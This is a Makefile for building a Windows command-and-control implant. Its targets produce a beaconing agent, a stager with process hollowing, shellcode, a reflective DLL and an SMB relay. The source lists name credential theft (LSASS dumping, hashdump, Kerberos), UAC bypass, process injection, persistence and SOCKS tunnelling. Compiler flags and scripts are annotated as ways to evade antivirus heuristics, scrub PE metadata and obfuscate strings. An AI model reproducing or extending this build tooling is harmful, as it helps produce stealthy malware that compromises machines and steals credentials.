# ── Toolchain detection — Windows (MSYS2) or Linux (cross-compile) ──────────
ifeq ($(OS),Windows_NT)
  MSYS2   ?= C:/msys64/mingw64
  CC      ?= $(MSYS2)/bin/gcc.exe
  STRIP   ?= $(MSYS2)/bin/strip.exe
  OBJCOPY ?= $(MSYS2)/bin/objcopy.exe
  WINDRES ?= $(MSYS2)/bin/windres.exe
  PYTHON  ?= python
  # Force linker temp dir (ld.exe ignores shell TEMP on some MSYS2 setups)
  export TMP  := $(or $(TMP),$(TEMP),C:/Windows/Temp)
  export TEMP := $(TMP)
else
  # Ubuntu/Debian: apt install gcc-mingw-w64-x86-64 mingw-w64
  MSYS2   ?= /usr/x86_64-w64-mingw32
  CC      ?= x86_64-w64-mingw32-gcc
  STRIP   ?= x86_64-w64-mingw32-strip
  OBJCOPY ?= x86_64-w64-mingw32-objcopy
  WINDRES ?= x86_64-w64-mingw32-windres
  PYTHON  ?= python3
endif

# Guard: must run make from the agent/ directory (include/bof.h must be reachable)
ifeq ($(wildcard include/bof.h),)
  $(error Run make from the agent/ directory, not from: $(CURDIR))
endif

BUILDDIR = .

# -DCURL_STATICLIB removed: curl linked dynamically (libcurl-4.dll)
JITTER_PCT ?= 40
# -fno-ident         : supprime la string "GCC: (x86_64-posix-seh...)" dans .comment
# -fno-asynchronous-unwind-tables : supprime .eh_frame (réduit surface heuristique)
# -fno-exceptions    : pas d'exception C++ → pas de .pdata/.xdata MSVC-style
# -Wl,--no-insert-timestamp : ld n'écrit pas de timestamp (pe_scrub en met un aléatoire)
CFLAGS  = -O2 -Wall -Wextra -DNDEBUG -DWIN32_LEAN_AND_MEAN \
          -fno-ident -fno-asynchronous-unwind-tables -fno-exceptions \
          -fno-stack-protector \
          -DJITTER_PCT=$(JITTER_PCT)

# Mixed linking: -mwindows suppresses console
# curl = dynamic (DLL), mbedTLS = static, stdlib = static
LDFLAGS = -mwindows -static-libgcc -static-libstdc++ -Wl,--no-insert-timestamp

INCLUDE = -Iinclude \
          -I$(MSYS2)/include

LIBPATH = -L$(MSYS2)/lib

# mbedTLS static, curl dynamic (avoids HTTP/3 static dep chain)
LIBS    = -Wl,-Bstatic   -lmbedcrypto -lbcrypt \
          -Wl,-Bdynamic  -lcurl \
          -Wl,-Bstatic   -lws2_32 -lwinhttp -lnetapi32 -ladvapi32 \
                         -lwldap32 -lcrypt32 -lsecur32 -liphlpapi \
                         -lgdi32 -lole32 -loleaut32 -luuid

# Standalone: HTTP channel only (WinHTTP loaded at runtime — no IAT entry)
# Excludes teams.c / github.c / doh.c — no libcurl required.
LIBS_SA = -Wl,-Bstatic   -lmbedcrypto -lbcrypt \
          -Wl,-Bstatic   -lws2_32 -lnetapi32 -ladvapi32 \
                         -lwldap32 -lcrypt32 -lsecur32 -liphlpapi \
                         -lgdi32 -lole32 -loleaut32 -luuid

SRC_SA  = src/main.c                 \
          src/beacon.c               \
          src/util.c                 \
          src/adv_lazy.c             \
          src/evs.c                  \
          src/crypto/chacha.c        \
          src/crypto/handshake.c     \
          src/channels/http.c        \
          src/channels/http_only.c   \
          src/commands/shell.c       \
          src/commands/upload.c      \
          src/commands/download.c    \
          src/commands/ps.c          \
          src/commands/getpid.c      \
          src/commands/token.c       \
          src/commands/screenshot.c  \
          src/commands/execasm.c     \
          src/commands/fs.c          \
          src/commands/reg.c         \
          src/commands/lsass.c       \
          src/commands/hashdump.c    \
          src/commands/portscan.c    \
          src/commands/spawn.c       \
          src/commands/wmi.c         \
          src/commands/kerberos.c    \
          src/commands/uac.c         \
          src/commands/getsystem.c   \
          src/commands/lpe_check.c   \
          src/channels/smb.c         \
          src/evasion/evasion.c      \
          src/inject/inject.c        \
          src/inject/spoof_stub.S    \
          src/persist/persist.c      \
          src/bof/bof.c              \
          src/socks/socks.c          \
          src/socks/rportfwd.c

# Lean: no inject/screenshot/lsass/hashdump/kerberos/execasm — minimal capability surface
SRC_LEAN = src/main.c                    \
           src/beacon.c                  \
           src/util.c                    \
           src/adv_lazy.c                \
           src/evs.c                     \
           src/crypto/chacha.c           \
           src/crypto/handshake.c        \
           src/channels/http.c           \
           src/channels/http_only.c      \
           src/commands/shell.c          \
           src/commands/upload.c         \
           src/commands/download.c       \
           src/commands/ps.c             \
           src/commands/getpid.c         \
           src/commands/token.c          \
           src/commands/fs.c             \
           src/commands/reg.c            \
           src/commands/portscan.c       \
           src/commands/spawn.c          \
           src/commands/wmi.c            \
           src/commands/uac.c            \
           src/commands/getsystem.c      \
           src/commands/lpe_check.c      \
           src/channels/smb.c            \
           src/evasion/evasion.c         \
           src/inject/inject_stub.c      \
           src/persist/persist.c         \
           src/bof/bof.c                 \
           src/socks/socks.c             \
           src/socks/rportfwd.c

SRC = src/main.c                 \
      src/beacon.c               \
      src/util.c                 \
      src/adv_lazy.c             \
      src/evs.c                  \
      src/crypto/chacha.c        \
      src/crypto/handshake.c     \
      src/channels/github.c      \
      src/channels/http.c        \
      src/channels/teams.c       \
      src/channels/doh.c         \
      src/commands/shell.c       \
      src/commands/upload.c      \
      src/commands/download.c    \
      src/commands/ps.c          \
      src/commands/getpid.c      \
      src/commands/token.c       \
      src/commands/screenshot.c  \
      src/commands/execasm.c     \
      src/commands/fs.c          \
      src/commands/reg.c         \
      src/commands/lsass.c       \
      src/commands/hashdump.c    \
      src/commands/portscan.c    \
      src/commands/spawn.c       \
      src/commands/wmi.c         \
      src/commands/kerberos.c    \
      src/commands/uac.c         \
      src/commands/getsystem.c   \
      src/commands/lpe_check.c   \
      src/channels/smb.c         \
      src/evasion/evasion.c      \
      src/inject/inject.c        \
      src/inject/spoof_stub.S    \
      src/persist/persist.c      \
      src/bof/bof.c              \
      src/socks/socks.c          \
      src/socks/rportfwd.c

TARGET  = $(BUILDDIR)/agent.exe
RES_SRC = res/agent.rc
RES_OBJ = $(BUILDDIR)/agent_res.o

# DLLs to ship alongside agent.exe (copy from MSYS2 after build)
DLLS   = $(MSYS2)/bin/libcurl-4.dll \
         $(MSYS2)/bin/libssl-3.dll  \
         $(MSYS2)/bin/libcrypto-3.dll

LIFTER_SRC  = src/lifter/lifter.c \
              src/evs.c

LIFTER_LIBS = -Wl,-Bstatic -ladvapi32 -lshell32 -luser32 -lkernel32 \
                            -lole32 -luuid

STAGER_SRC = src/stager/stager.c \
             src/stager/hollow.c \
             src/crypto/chacha.c \
             src/evs.c

STAGER_LIBS = -Wl,-Bstatic -lmbedcrypto -lbcrypt \
              -Wl,-Bstatic -lws2_32 -lwinhttp -ladvapi32 \
                           -lwldap32 -lcrypt32 -lsecur32 \
                           -lgdi32 -lole32 -loleaut32 -luuid

$(RES_OBJ): $(RES_SRC) res/agent.manifest
	$(WINDRES) -i $(RES_SRC) --input-format=rc -o $(RES_OBJ) --output-format=coff

all: config $(RES_OBJ) $(TARGET)

lifter:
	$(CC) -O2 -Wall -Wextra -DNDEBUG -DWIN32_LEAN_AND_MEAN \
	    $(INCLUDE) $(LIFTER_SRC) \
	    $(LIBPATH) $(LIFTER_LIBS) \
	    -mwindows -static-libgcc \
	    -o lifter.exe
	$(STRIP) --strip-all lifter.exe
	@echo "[ok] lifter.exe"

standalone: config $(RES_OBJ)
	$(CC) $(CFLAGS) -DHTTP_ONLY $(INCLUDE) $(SRC_SA) $(RES_OBJ) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) tools/pe_scrub.py $(TARGET)
	@echo "[ok] standalone built $(TARGET) (no curl DLL)"

stager: stager-config stager-only

stager-config:
	$(PYTHON) tools/gen_stager_config.py --url "$(STAGE_URL)" --key "$(STAGE_KEY)"

# stager-only: compile stager without regenerating stager_config.h
# Used by the payload builder API (config already written by the server).
stager-only:
	$(CC) $(CFLAGS) -DHTTP_ONLY $(INCLUDE) $(STAGER_SRC) $(LIBPATH) $(STAGER_LIBS) $(LDFLAGS) -o stager.exe
	@echo "[ok] stager.exe"

# shellcode-only: convert agent.exe → agent.bin via donut
# Requires: pip install donut-shellcode
# Note: run build-only first to produce agent.exe
shellcode-only:
	$(PYTHON) tools/pe2sc.py $(BUILDDIR)/agent.exe $(BUILDDIR)/agent.bin
	@echo "[ok] shellcode agent.bin"

# reflective-dll-only: build agent as a reflective DLL (no console, no WinMain).
# The DLL exports "ReflectiveLoader" — any injector can find it by EAT and call
# it to self-load the agent into memory without LoadLibrary.
#   -shared / -Wl,--dll   : produce a PE DLL
#   -D_REFLECTIVE_DLL     : switches main.c to agent_main() + includes dllmain.c/reflect.c
#   -Wl,--export-all-symbols omitted: only ReflectiveLoader needs export (in reflect.c)
reflective-dll-only:
	$(CC) $(CFLAGS) -D_REFLECTIVE_DLL -DHTTP_ONLY -shared \
	    $(INCLUDE) \
	    $(SRC_SA) \
	    src/reflect/reflect.c \
	    src/reflect/dllmain.c \
	    $(LIBPATH) $(LIBS_SA) \
	    -static-libgcc -static-libstdc++ \
	    -Wl,--dll \
	    -o $(BUILDDIR)/agent.dll
	@echo "[ok] agent.dll (reflective)"

# lean: reduced surface — no inject/screenshot/lsass/hashdump/kerberos/execasm
lean: config $(RES_OBJ)
	$(CC) $(CFLAGS) -DHTTP_ONLY -DLEAN $(INCLUDE) $(SRC_LEAN) $(RES_OBJ) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) tools/pe_scrub.py $(TARGET)
	@echo "[ok] lean build $(TARGET)"

# build-only: compile standalone without regenerating agent_config.h
# Used by the payload builder API (config already written by the server).
build-only: $(RES_OBJ)
	$(CC) $(CFLAGS) -DHTTP_ONLY $(INCLUDE) $(SRC_SA) $(RES_OBJ) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) tools/pe_scrub.py $(TARGET)
	@echo "[ok] build-only $(TARGET)"

config:
	$(PYTHON) tools/obfuscate.py
	$(PYTHON) tools/gen_evs_strings.py

$(TARGET): $(SRC) $(RES_OBJ)
	$(CC) $(CFLAGS) $(INCLUDE) $(SRC) $(RES_OBJ) $(LIBPATH) $(LIBS) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	@echo "[ok] built $(TARGET)"

# Copy required DLLs next to the binary
bundle: $(TARGET)
	@for dll in $(DLLS); do \
	    cp -v "$$dll" . 2>/dev/null || true; \
	done

strip: $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	@echo "[ok] stripped"

relay:
	$(CC) -O2 -Wall -DNDEBUG -DWIN32_LEAN_AND_MEAN \
	    $(INCLUDE) src/relay/smb_relay.c \
	    $(LIBPATH) \
	    -Wl,-Bstatic -lws2_32 -lwinhttp -ladvapi32 \
	                 -lwldap32 -lcrypt32 -lsecur32 \
	                 -lgdi32 -lole32 -loleaut32 -luuid \
	    -static-libgcc \
	    -o smb_relay.exe
	@echo "[ok] smb_relay.exe"

debug:
	$(CC) $(CFLAGS) -DHTTP_ONLY -DBEACON_INTERVAL=3000 -DJITTER_PCT=0 -DSKIP_EVASION \
	    $(INCLUDE) $(SRC_SA) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(BUILDDIR)/agent_debug.exe
	$(STRIP) --strip-all $(BUILDDIR)/agent_debug.exe
	@echo "[ok] agent_debug.exe (interval=3s, no jitter, stripped)"

clean:
ifeq ($(OS),Windows_NT)
	del /Q "$(BUILDDIR)\agent.exe" "$(BUILDDIR)\agent_res.o" 2>nul || true
else
	rm -f $(BUILDDIR)/agent.exe $(BUILDDIR)/agent_res.o
endif

.PHONY: all standalone lean build-only debug stager stager-config stager-only shellcode-only reflective-dll-only bundle strip relay clean
